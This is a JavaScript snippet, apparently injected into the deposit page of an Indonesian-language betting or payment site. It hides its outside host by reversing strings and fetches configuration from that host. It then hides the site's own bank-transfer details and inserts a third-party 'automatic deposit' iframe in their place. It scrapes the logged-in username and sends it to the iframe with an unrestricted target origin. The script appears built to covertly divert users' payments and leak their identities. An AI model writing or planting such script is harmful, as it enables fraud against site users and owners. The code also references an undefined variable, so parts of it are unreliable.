var urlframe = '';
var usernameQris = '';
if(!domainsystem) var domainsystem = 'piv.sitamoto.1emarfi';

var scrollid='#content';
var autoqris_register;
var autoqris_load;
var srollto_contentqris;

var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
var eventer = window[eventMethod];
var messageEvent = eventMethod === "attachEvent" ? "onmessage" : "message";
eventer(messageEvent, function (e) {
    if (typeof e.data == "string") {
        if (e.data === 'onload') {
            document.getElementById('iframeaudotdepoqris').contentWindow.postMessage('{"username":"' + usernameQris + '"}', '*');
        } else if(e.data.charAt(0) == '{') {
            var heightC = JSON.parse(e.data);
            if(heightC.height) {
                document.getElementById('injectautodepoqris').style.height = heightC.height + 'px';
                $(scrollid).animate({
                    scrollTop: srollto_contentqris+100
                }, 500);
            }
        }
    }
});

function setupOtomatis() {
    autoqris_load=setInterval(function () {
        if($('#scumloph19bank21_').length>0 || $('#banktujuan').length>0) {
            if($('#injectautodepoqris').length==0) {
                if($('#scumloph19bank21_').length>0) {
                    $('<div class="tile-footer bg-transparent-white-2 rounded-bottom-corners"><div class="row"><div class="col-sm-6"><button type="button" class="btn btn-lg btn-block btn-primary" id="btnDepositOtomatis">Otomatis Deposit</button></div><div class="col-sm-6"><button type="button" class="btn btn-lg btn-block btn-kirim" id="btnDepositManual">Manual Deposit</button></div></div></div><div id="bodyiframeqris" class="tile-body no-vpadding"><div class="row"><div id="injectautodepoqris" class="col-sm-12" style="height: 500px;"><iframe id="iframeaudotdepoqris" scrolling="no" style="height: 100%; width: 100%; overflow: hidden;" src="'+urlframe+'&msg='+btoa('{"username":"'+usernameQris+'"}')+'"></iframe></div></div></div>').insertBefore($('#returninfo'));
                    $('#returninfo').hide();
                    $('#btnDepositOtomatis').click(function(){
                        $('#btnDepositManual').removeClass('btn-primary');
                        $('#btnDepositManual').addClass('btn-kirim');

                        $('#btnDepositOtomatis').removeClass('btn-kirim');
                        $('#btnDepositOtomatis').addClass('btn-primary');

                        $('#bodyiframeqris').show();
                        $('#returninfo').hide();
                    });
                    $('#btnDepositManual').click(function(){
                        $('#btnDepositOtomatis').removeClass('btn-primary');
                        $('#btnDepositOtomatis').addClass('btn-kirim');

                        $('#btnDepositManual').removeClass('btn-kirim');
                        $('#btnDepositManual').addClass('btn-primary');

                        $('#bodyiframeqris').hide();
                        $('#returninfo').show();
                    });
                } else if($('#banktujuan').length>0) {
                    $('form').first().prev().prev().text('MANUAL DEPOSIT');
                    var parentNode = $('form').first().parent();
                    parentNode.prepend('<h3 class="color-blue">OTOMATIS DEPOSIT</h3><div class="decoration"></div><div id="injectautodepoqris" style="height: 500px;"><iframe id="iframeaudotdepoqris" scrolling="no" style="height: 100%; width: 100%; overflow: hidden;" src="'+urlframe+'&msg='+btoa('{"username":"'+usernameQris+'"}')+'"></iframe></div><div class="decoration"></div>');
                }
            }
        }
    });
}

autoqris_register=setInterval(function () {
    if(window.jQuery) {
        if($('#scumloph19bank21_').length>0 || $('#banktujuan').length>0) {
            clearInterval(autoqris_register);
            var pathdata = "/atad/"+domainsystem+"//:sptth";
            fetch(pathdata.split('').reverse().join('') + uuidautodepo + ".txt")
            .then(res => {
                if(res.ok) {
                    return res.text();
                } else {
                    return fetch(response.headers.get('Location')).then(res => res.text());
                }
            })
            .then(data => {
                if(data!='') {
                    var pathframe = '=atad?/'+domainsystem+'//:sptth';
                    urlframe = pathframe.split('').reverse().join('')+data;
                    if($('#banktujuan').length>0) {
                        scrollid='html, body';
                        usernameQris=$('.user-login').text().toLowerCase();
                    } else {
                        usernameQris=$('#current-user').text().trim().split(' ')[0];
                    }
                    setupOtomatis();
                }
            });
        }
    }
});